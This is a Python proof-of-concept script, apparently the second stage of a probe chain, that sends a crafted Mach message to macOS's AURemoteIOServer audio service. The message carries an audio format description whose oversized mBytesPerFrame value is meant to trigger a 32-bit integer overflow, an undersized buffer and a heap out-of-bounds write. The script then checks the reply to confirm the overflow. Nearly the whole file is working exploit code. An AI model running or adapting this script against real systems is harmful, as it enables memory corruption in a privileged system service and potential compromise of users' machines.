import ctypes as C, struct

# Run after surface_c_probe_a.py. Paste nc_hndl from its output.
# Tests ASBD integer overflow in IPCAUSharedMemoryBase::InitClient.
# mBytesPerFrame=0xFFF001 → overflow: (0x1000 * 0xFFF001 + 15) in 32-bit = 0x100f → alloc 0x1000
# Actual audio stride would be ~16 GB → heap OOB write in AURemoteIOServer.

NC_HNDL = 0xDEAD  # <-- replace with value from probe_a output
if NC_HNDL == 0xDEAD:
    print("BAIL: set NC_HNDL from probe_a output")
    raise SystemExit(1)

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32.in_dll(L, "bootstrap_port").value
svc = C.c_uint32(0)
kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: raise SystemExit(1)

rp = L.mach_reply_port()

COMPLEX = 0x80000000
SO_BITS = (0x14 << 8) | 0x13

# Crafted ASBD: mBytesPerFrame=0xFFF001 to trigger overflow in InitClient
# (0x1000 * 0xFFF001) + 15 = 0xFFF001000 + 15 = 0x10000100F → 32-bit = 0x100F → aligned = 0x1000
OVERFLOW_BPF = 0xFFF001

# ASBD layout (40 bytes):
# mSampleRate(8d) mFormatID(4) mFormatFlags(4) mBytesPerPacket(4) mFramesPerPacket(4)
# mBytesPerFrame(4) mChannelsPerFrame(4) mBitsPerChannel(4)
ASBD_NORMAL = struct.pack('<dIIIIIIII',
    44100.0,
    0x6C70636D,  # lpcm
    0x2C,        # float+packed+LE (bit 5 clear = interleaved → uses mChannelsPerFrame)
    4,           # mBytesPerPacket
    1,           # mFramesPerPacket
    4,           # mBytesPerFrame (normal)
    1,           # mChannelsPerFrame
    32,          # mBitsPerChannel
    0)           # padding
assert len(ASBD_NORMAL) == 40, len(ASBD_NORMAL)

# ASBD2 with overflow-triggering mBytesPerFrame
ASBD_OVERFLOW = struct.pack('<dIIIIIIII',
    44100.0,
    0x6C70636D,  # lpcm
    0x2C,        # bit 5 clear → interleaved path
    OVERFLOW_BPF, # mBytesPerPacket
    1,            # mFramesPerPacket
    OVERFLOW_BPF, # mBytesPerFrame ← CRAFTED
    1,            # mChannelsPerFrame
    32,           # mBitsPerChannel
    0)
assert len(ASBD_OVERFLOW) == 40, len(ASBD_OVERFLOW)

# Initialize message: non-complex, msg_id=0x157c3, size=0x78
# req[0x20]=nc_hndl, req[0x24]=0, req[0x28]=ASBD1, req[0x50]=ASBD2
buf = bytearray(0x200)
struct.pack_into('<IIIIII', buf, 0x00,
    SO_BITS, 0x78, svc.value, rp, 0, 0x157c3)
struct.pack_into('<I', buf, 0x20, NC_HNDL)
buf[0x28:0x50] = ASBD_NORMAL    # ASBD1 = normal
buf[0x50:0x78] = ASBD_OVERFLOW  # ASBD2 = overflow trigger

buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)
print(f"Sending Initialize with overflow ASBD2 (mBytesPerFrame=0x{OVERFLOW_BPF:x}) ...")
kr = L.mach_msg(buf_c, 0x103, 0x78, len(buf), rp, 8000, 0)
print(f"Initialize mach_msg kr={kr:#010x}")

if kr == 0x10004003:
    print("TIMEOUT (8s) — server hung or crash likely, no reply")
    raise SystemExit(0)
if kr != 0:
    print(f"mach_msg error: {kr:#x}")
    raise SystemExit(1)

in_bits = struct.unpack_from('<I', buf, 0)[0]
in_size = struct.unpack_from('<I', buf, 4)[0]
in_dcnt = struct.unpack_from('<I', buf, 0x18)[0]
is_cmplx = bool(in_bits & COMPLEX)
print(f"reply: bits={in_bits:#x} size={in_size} complex={is_cmplx} descs={in_dcnt}")

if not is_cmplx:
    ret = struct.unpack_from('<i', buf, 0x20)[0]
    print(f"  non-complex (error) ret={ret:#010x}")
    print("  0xBF88AEC1 = kAudioUnitErr_InvalidProperty or ASBD rejected")
    print("  0xBF88AECD = kAudioUnitErr_FormatNotSupported")
    print("  Server rejected crafted ASBD — need different format or value")
    raise SystemExit(0)

# Success: check OOL descriptor sizes
print("SUCCESS — complex reply:")
for i in range(in_dcnt):
    off   = 0x1c + i * 16
    addr  = struct.unpack_from('<Q', buf, off)[0]
    flags = struct.unpack_from('<I', buf, off + 8)[0]
    sz    = struct.unpack_from('<I', buf, off + 12)[0]
    print(f"  OOL[{i}]: addr={hex(addr)} sz={hex(sz)}")
    if sz == 0x1000:
        print(f"    *** OVERFLOW CONFIRMED: sz=0x1000 matches crafted result!")
    if sz >= 0x100000:
        print(f"    normal-sized allocation (no overflow)")

print("DONE")
